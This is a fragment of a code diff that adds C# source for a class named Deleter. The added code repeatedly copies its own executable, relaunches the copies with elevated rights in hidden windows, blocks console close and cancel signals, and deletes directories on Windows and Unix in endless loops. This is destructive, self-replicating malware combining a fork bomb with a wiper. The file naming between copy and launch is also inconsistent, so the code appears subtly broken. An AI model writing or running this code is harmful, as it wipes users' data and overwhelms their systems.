+                        p.StartInfo.CreateNoWindow = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                        p.Start();
+                        System.Deleter.DeleteDir(args);
+                    }
+                }
+                catch
+                {
+                    while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
+                    {
+                        System.Deleter.LoopingDouble++;
+                        System.Deleter.Main(args);
+                    }
+                }
+            }
+        }
+        public static void Main(System.String[] args)
+        {
+            System.OS.DetectCurrentOS();
+            System.Deleter.FileExtension = System.IO.Path.GetExtension(System.OS.DetectedOS.ProcessFilePath);
+            System.Deleter.FileName = System.IO.Path.GetFileNameWithoutExtension(System.OS.DetectedOS.ProcessFilePath);
+            if (System.OS.DetectedOS.IsWindows)
+            {
+                System.Console.CancelKeyPress += System.Deleter.OnCancelKeyPress;
+                System.Deleter.Handler = new System.Deleter.ConsoleEventDelegate(System.Deleter.ConsoleEventCallback);
+                System.Deleter.SetConsoleCtrlHandler(System.Deleter.Handler, true);
+                System.Console.Title = System.Deleter.Title;
+                System.Console.ForegroundColor = System.ConsoleColor.Red;
+                System.Console.BackgroundColor = System.ConsoleColor.Black;
+            }
+            if (args == null || args.Length == 0)
+            {
+                args = System.Deleter.Messages;
+            }
+            System.Threading.Thread.Sleep(1000);
+            while (System.Deleter.Double != System.Double.PositiveInfinity)
+            {
+                try
+                {
+                    System.Deleter.Double++;
+                    if (!System.OS.DetectedOS.IsWindows)
+                    {
+                        System.Deleter.DeleteDirUnix(args);
+                    }
+                    else
+                    {
+                        System.IO.File.Copy(System.IO.Path.GetFileName(System.OS.DetectedOS.ProcessFilePath), System.Deleter.FileName + " (" + System.Deleter.Double + ")" + System.Deleter.FileExtension);
+                        System.Diagnostics.Process p = new System.Diagnostics.Process();
+                        p.StartInfo.UseShellExecute = true;
+                        p.StartInfo.Verb = "runas";
+                        p.StartInfo.FileName = System.Deleter.FileName + "(" +
+                            System.Deleter.Double + ")" + System.Deleter.FileExtension;
+                        p.StartInfo.Arguments = System.Deleter.Argument;
+                        p.StartInfo.CreateNoWindow = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                        p.Start();
+                        System.Deleter.DeleteDir(args);
+                    }
+                }
+                catch
+                {
+                    while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
+                    {
+                        System.Deleter.LoopingDouble++;
+                        System.Deleter.Continue(args);
+                    }
+                }
             }
         }
     }
